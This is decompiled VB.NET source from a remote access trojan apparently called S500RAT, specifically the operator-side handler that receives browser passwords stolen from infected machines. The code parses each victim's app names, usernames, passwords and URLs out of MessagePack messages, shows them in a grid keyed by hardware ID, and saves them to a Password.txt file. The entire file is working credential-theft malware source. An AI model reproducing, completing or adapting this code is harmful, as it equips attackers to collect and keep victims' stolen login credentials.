Imports System
Imports System.Drawing
Imports System.IO
Imports System.Text
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000056 RID: 86
	Public Class FrmPassword
		' Token: 0x060011A2 RID: 4514 RVA: 0x0009B718 File Offset: 0x00099918
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			' The following expression was wrapped in a checked-statement
			Try
				Dim formPasswordBrowser As FormPasswordBrowser = CType(Application.OpenForms("FormPasswordBrowser" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormPasswordBrowser)
				Dim flag As Boolean = formPasswordBrowser IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formPasswordBrowser.Client Is Nothing
					If flag2 Then
						formPasswordBrowser.Client = client
						formPasswordBrowser.Timer1.Enabled = True
					End If
					formPasswordBrowser.ListPass.Rows.Clear()
					Dim asString As String = unpack_msgpack.ForcePathObject("Message").AsString
					Dim array As String() = asString.Split(New String() { "-=>" }, StringSplitOptions.None)
					Dim stringBuilder As StringBuilder = New StringBuilder()
					Dim num As Integer = array.Length - 1
					For i As Integer = 0 To num
						Dim flag3 As Boolean = array(i).Length > 0
						If flag3 Then
							Dim text As String = array(i)
							Dim text2 As String = array(i + 1)
							Dim text3 As String = array(i + 2)
							Dim text4 As String = array(i + 3)
							Dim image As Image = formPasswordBrowser.ImageList1.Images(text + ".png")
							formPasswordBrowser.ListPass.Rows.Add(New Object() { image, text, text2, text3, text4 })
							Dim text5 As String = "========================================"
							stringBuilder.Append(String.Concat(New String() { text5, vbCrLf & "App : ", text, vbCrLf & "Username : ", text2, vbCrLf & "Password : ", text3, vbCrLf & "Url : ", text4, vbCrLf & vbCrLf }))
						End If
						i += 3
					Next
					Try
						File.WriteAllText(formPasswordBrowser.FullPath + "Password.txt", stringBuilder.ToString())
					Catch ex As Exception
					End Try
				End If
			Catch ex2 As Exception
				ListLogs.AddArray("Task Manager " + client.IP + " Error : " + ex2.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
